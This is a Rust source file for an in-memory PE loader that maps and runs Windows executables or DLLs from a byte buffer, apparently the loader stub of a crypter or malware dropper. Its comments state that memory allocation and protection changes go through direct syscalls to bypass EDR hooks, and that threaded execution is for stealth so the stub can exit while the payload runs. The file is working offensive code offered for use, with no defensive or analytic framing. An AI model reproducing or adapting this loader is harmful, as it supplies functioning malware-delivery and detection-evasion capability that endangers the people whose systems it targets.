// PE Loader
// Loads and executes PE files entirely in memory

use winapi::um::winnt::*;
use winapi::um::memoryapi::*;
use winapi::um::libloaderapi::*;
use winapi::um::errhandlingapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::handleapi::*;
use crate::syscalls::{sys_allocate_memory, sys_protect_memory};
use std::ptr;
use std::ffi::CString;

/// PE structure for in-memory loading
#[repr(C)]
struct PEInfo {
    dos_header: *const IMAGE_DOS_HEADER,
    nt_headers: *const IMAGE_NT_HEADERS64,
    image_base: *mut u8,
    size_of_image: usize,
    entry_point: extern "system" fn() -> u32,
}

/// Load and execute PE from memory (direct execution)
pub unsafe fn load_and_execute_pe(pe_data: &[u8]) -> Result<u32, String> {
    load_and_execute_pe_internal(pe_data, false)
}

/// Load and execute PE from memory in a separate thread
pub unsafe fn load_and_execute_pe_threaded(pe_data: &[u8]) -> Result<(), String> {
    load_and_execute_pe_internal(pe_data, true)?;
    Ok(())
}

/// Internal function to load and execute PE
unsafe fn load_and_execute_pe_internal(pe_data: &[u8], use_thread: bool) -> Result<u32, String> {
    if pe_data.len() < 64 {
        return Err("PE data too small".to_string());
    }

    // Step 1: Parse DOS header
    let dos_header = pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return Err("Invalid DOS signature".to_string());
    }

    // Step 2: Parse PE header
    let pe_offset = (*dos_header).e_lfanew as usize;
    if pe_offset >= pe_data.len() {
        return Err("PE header offset out of bounds".to_string());
    }

    let nt_headers = pe_data.as_ptr().add(pe_offset) as *const IMAGE_NT_HEADERS64;
    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return Err("Invalid PE signature".to_string());
    }

    let optional_header = &(*nt_headers).OptionalHeader;
    let image_base = optional_header.ImageBase as *mut u8;
    let size_of_image = optional_header.SizeOfImage as usize;
    let entry_point_rva = optional_header.AddressOfEntryPoint as usize;

    // Step 3: Allocate memory (use syscalls to bypass EDR hooks)
    let allocated_base = sys_allocate_memory(
        image_base as *mut _,
        size_of_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    let final_base = if allocated_base.is_null() {
        // Try allocating at any address if preferred base fails
        sys_allocate_memory(
            ptr::null_mut(),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    } else {
        allocated_base
    };

    if final_base.is_null() {
        return Err("Failed to allocate memory for PE".to_string());
    }

    // Step 4: Copy PE headers
    let header_size = optional_header.SizeOfHeaders as usize;
    if header_size > pe_data.len() {
        VirtualFree(final_base, 0, MEM_RELEASE);
        return Err("Header size exceeds PE data".to_string());
    }

    ptr::copy_nonoverlapping(
        pe_data.as_ptr(),
        final_base as *mut u8,
        header_size.min(pe_data.len()),
    );

    // Step 5: Copy sections
    let section_header_offset = pe_offset + 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
    let num_sections = (*nt_headers).FileHeader.NumberOfSections as usize;
    
    for i in 0..num_sections {
        let section_offset = section_header_offset + (i * 40); // IMAGE_SECTION_HEADER is 40 bytes
        if section_offset + 40 > pe_data.len() {
            continue;
        }

        let section = pe_data.as_ptr().add(section_offset) as *const IMAGE_SECTION_HEADER;
        let virtual_address = (*section).VirtualAddress as usize;
        let size_of_raw_data = (*section).SizeOfRawData as usize;
        let pointer_to_raw_data = (*section).PointerToRawData as usize;

        if pointer_to_raw_data < pe_data.len() && size_of_raw_data > 0 {
            let section_dest = final_base.add(virtual_address) as *mut u8;
            let section_src = pe_data.as_ptr().add(pointer_to_raw_data);
            let copy_size = size_of_raw_data.min(pe_data.len() - pointer_to_raw_data);
            
            ptr::copy_nonoverlapping(section_src, section_dest, copy_size);
        }
    }

    // Step 6: Resolve imports
    resolve_imports(final_base as *mut u8, nt_headers)?;

    // Step 7: Apply relocations
    apply_relocations(final_base as *mut u8, nt_headers, image_base as usize)?;

    // Step 8: Set section permissions
    set_section_permissions(final_base as *mut u8, nt_headers)?;

    // Step 9: Calculate and call entry point
    let entry_point = final_base.add(entry_point_rva) as *const ();
    
    // Check if DLL or EXE
    let characteristics = (*nt_headers).FileHeader.Characteristics;
    
    if use_thread {
        // Execute in separate thread (for stealth - stub can exit while payload runs)
        if (characteristics & IMAGE_FILE_DLL) != 0 {
            // DLL - call DllMain in thread with proper signature
            type DllMain = extern "system" fn(
                hinst_dll: *mut winapi::ctypes::c_void,
                fdw_reason: u32,
                lpv_reserved: *mut winapi::ctypes::c_void,
            ) -> i32;
            let dll_main: DllMain = std::mem::transmute(entry_point);
            
            // Thread wrapper that calls DllMain with correct parameters
            extern "system" fn dll_main_wrapper(lp_param: *mut winapi::ctypes::c_void) -> u32 {
                unsafe {
                    // lp_param points to a struct containing [base_ptr, entry_point]
                    let params = lp_param as *mut (*mut winapi::ctypes::c_void, *const ());
                    let (base, ep) = (*params);
                    let dll_main: DllMain = std::mem::transmute(ep);
                    let _ = dll_main(base, DLL_PROCESS_ATTACH, ptr::null_mut());
                    0
                }
            }
            
            // Allocate space for parameters (base, entry_point)
            let param_size = std::mem::size_of::<(*mut winapi::ctypes::c_void, *const ())>();
            let params = VirtualAlloc(
                ptr::null_mut(),
                param_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            ) as *mut (*mut winapi::ctypes::c_void, *const ());
            
            if params.is_null() {
                // Fallback to direct execution
                let _ = dll_main(final_base as *mut _, DLL_PROCESS_ATTACH, ptr::null_mut());
                return Ok(0);
            }
            
            (*params).0 = final_base as *mut winapi::ctypes::c_void;
            (*params).1 = entry_point;
            
            let thread_handle = CreateThread(
                ptr::null_mut(),
                0,
                Some(dll_main_wrapper),
                params as *mut winapi::ctypes::c_void,
                0,
                ptr::null_mut(),
            );
            
            if thread_handle.is_null() {
                VirtualFree(params, 0, MEM_RELEASE);
                // Fallback to direct execution
                let _ = dll_main(final_base as *mut _, DLL_PROCESS_ATTACH, ptr::null_mut());
                return Ok(0);
            }
            
            // Don't wait - let thread run independently
            // Close handle so thread can continue after stub exits
            CloseHandle(thread_handle);
            Ok(0)
        } else {
            // EXE - call entry point in thread
            // EXE entry points typically take no parameters
            extern "system" fn exe_entry_wrapper(lp_param: *mut winapi::ctypes::c_void) -> u32 {
                unsafe {
                    let entry_fn: extern "system" fn() -> u32 = std::mem::transmute(
                        lp_param as *const ()
                    );
                    entry_fn()
                }
            }
            
            let thread_handle = CreateThread(
                ptr::null_mut(),
                0,
                Some(exe_entry_wrapper),
                entry_point as *mut winapi::ctypes::c_void,
                0,
                ptr::null_mut(),
            );
            
            if thread_handle.is_null() {
                // Fallback to direct execution
                let entry_fn: extern "system" fn() -> u32 = std::mem::transmute(entry_point);
                return Ok(entry_fn());
            }
            
            // Don't wait - let thread run independently
            // Close handle so thread can continue after stub exits
            CloseHandle(thread_handle);
            Ok(0)
        }
    } else {
        // Direct execution (original behavior)
        if (characteristics & IMAGE_FILE_DLL) != 0 {
            // DLL - call DllMain
            type DllMain = extern "system" fn(
                hinst_dll: *mut winapi::ctypes::c_void,
                fdw_reason: u32,
                lpv_reserved: *mut winapi::ctypes::c_void,
            ) -> i32;
            let dll_main: DllMain = std::mem::transmute(entry_point);
            let _ = dll_main(final_base as *mut _, DLL_PROCESS_ATTACH, ptr::null_mut());
            Ok(0)
        } else {
            // EXE - call entry point directly
            let entry_fn: extern "system" fn() -> u32 = std::mem::transmute(entry_point);
            Ok(entry_fn())
        }
    }
}

/// Resolve import table
unsafe fn resolve_imports(
    image_base: *mut u8,
    nt_headers: *const IMAGE_NT_HEADERS64,
) -> Result<(), String> {
    let optional_header = &(*nt_headers).OptionalHeader;
    let import_table_rva = optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize].VirtualAddress as usize;
    
    if import_table_rva == 0 {
        return Ok(()); // No imports
    }

    let mut import_desc = image_base.add(import_table_rva) as *mut IMAGE_IMPORT_DESCRIPTOR;

    while (*import_desc).Name != 0 {
        let dll_name_ptr = image_base.add((*import_desc).Name as usize) as *const i8;
        // Create CString from null-terminated string
        let mut dll_name_vec = Vec::new();
        let mut offset = 0;
        loop {
            let byte = *dll_name_ptr.add(offset);
            if byte == 0 {
                break;
            }
            dll_name_vec.push(byte as u8);
            offset += 1;
            if offset > 255 {
                return Err("DLL name too long".to_string());
            }
        }
        let dll_name = CString::new(dll_name_vec)
            .map_err(|_| "Invalid DLL name encoding".to_string())?;

        // Load library
        let module = LoadLibraryA(dll_name.as_ptr() as *const i8);
        if module.is_null() {
            // Continue with next import if DLL fails to load
            import_desc = import_desc.add(1);
            continue;
        }

        // Resolve functions
        let mut thunk_data = image_base.add((*import_desc).u.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
        let mut iat = image_base.add((*import_desc).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;

        while (*thunk_data).u1.AddressOfData != 0 {
            if ((*thunk_data).u1.Ordinal & IMAGE_ORDINAL_FLAG64) != 0 {
                // Import by ordinal
                // GetProcAddress expects ordinal cast as LPCSTR (pointer)
                // Windows API: (LPCSTR)((ULONG_PTR)(ordinal))
                let ordinal = ((*thunk_data).u1.Ordinal & 0xFFFF) as u16;
                let func_addr = GetProcAddress(module, (ordinal as usize) as *const i8);
                (*iat).u1.Function = func_addr as u64;
            } else {
                // Import by name
                let import_by_name = image_base.add((*thunk_data).u1.AddressOfData as usize) as *const IMAGE_IMPORT_BY_NAME;
                // Create CString from null-terminated string
                let mut func_name_vec = Vec::new();
                let mut offset = 0;
                let name_ptr = (*import_by_name).Name.as_ptr();
                loop {
                    let byte = *name_ptr.add(offset);
                    if byte == 0 {
                        break;
                    }
                    func_name_vec.push(byte);
                    offset += 1;
                    if offset > 255 {
                        break;
                    }
                }
                if let Ok(func_name) = CString::new(func_name_vec) {
                    let func_addr = GetProcAddress(module, func_name.as_ptr() as *const i8);
                    (*iat).u1.Function = func_addr as u64;
                }
            }

            thunk_data = thunk_data.add(1);
            iat = iat.add(1);
        }

        import_desc = import_desc.add(1);
    }

    Ok(())
}

/// Apply relocations
unsafe fn apply_relocations(
    image_base: *mut u8,
    nt_headers: *const IMAGE_NT_HEADERS64,
    preferred_base: usize,
) -> Result<(), String> {
    let optional_header = &(*nt_headers).OptionalHeader;
    let reloc_table_rva = optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize].VirtualAddress as usize;
    
    if reloc_table_rva == 0 {
        return Ok(()); // No relocations
    }

    let current_base = image_base as usize;
    let delta = current_base.wrapping_sub(preferred_base);

    if delta == 0 {
        return Ok(()); // No relocation needed
    }

    let mut reloc_block = image_base.add(reloc_table_rva) as *const IMAGE_BASE_RELOCATION;

    while (*reloc_block).SizeOfBlock != 0 {
        let num_entries = ((*reloc_block).SizeOfBlock as usize - 8) / 2;
        let entries = (reloc_block as *const u16).add(4) as *const u16;

        for i in 0..num_entries {
            let entry = *entries.add(i);
            let reloc_type = (entry >> 12) as u8;
            let offset = (entry & 0x0FFF) as usize;

            if reloc_type == IMAGE_REL_BASED_DIR64 {
                let reloc_addr = image_base.add((*reloc_block).VirtualAddress as usize + offset) as *mut u64;
                *reloc_addr = (*reloc_addr).wrapping_add(delta as u64);
            } else if reloc_type == IMAGE_REL_BASED_HIGHLOW {
                let reloc_addr = image_base.add((*reloc_block).VirtualAddress as usize + offset) as *mut u32;
                *reloc_addr = (*reloc_addr).wrapping_add(delta as u32);
            }
        }

        reloc_block = (reloc_block as *const u8).add((*reloc_block).SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
    }

    Ok(())
}

/// Set section permissions
unsafe fn set_section_permissions(
    image_base: *mut u8,
    nt_headers: *const IMAGE_NT_HEADERS64,
) -> Result<(), String> {
    let section_header_offset = 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
    let num_sections = (*nt_headers).FileHeader.NumberOfSections as usize;
    let section_headers = (nt_headers as *const u8).add(section_header_offset) as *const IMAGE_SECTION_HEADER;

    for i in 0..num_sections {
        let section = section_headers.add(i);
        let virtual_address = (*section).VirtualAddress as usize;
        let virtual_size = (*section).Misc.VirtualSize as usize;
        let characteristics = (*section).Characteristics;

        let mut protection = PAGE_READONLY;
        if (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 {
            if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
                protection = PAGE_EXECUTE_READWRITE;
            } else {
                protection = PAGE_EXECUTE_READ;
            }
        } else if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
            protection = PAGE_READWRITE;
        }

        let section_addr = image_base.add(virtual_address);
        let mut old_protect = 0u32;
        // Use syscall to bypass EDR hooks
        sys_protect_memory(
            section_addr as *mut _,
            virtual_size,
            protection,
            &mut old_protect,
        );
    }

    Ok(())
}
